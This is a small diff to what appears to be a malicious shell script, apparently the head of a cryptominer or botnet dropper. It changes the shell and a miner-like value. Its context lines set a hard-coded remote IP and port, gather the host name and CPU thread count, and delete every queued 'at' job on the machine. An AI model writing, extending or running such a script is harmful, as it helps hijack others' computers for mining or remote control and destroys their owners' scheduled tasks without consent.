@@ -1,6 +1,6 @@
-#!/bin/bash
+#!/bin/sh
 IPADR="95.216.187.139:4500"
-MNRCO="bopport"
+MNRCO="wewwws"
 ID="$(hostname)"
 THREADS="$(nproc --all)"
 for i in `atq | awk '{print $1}'`;do atrm $i;done
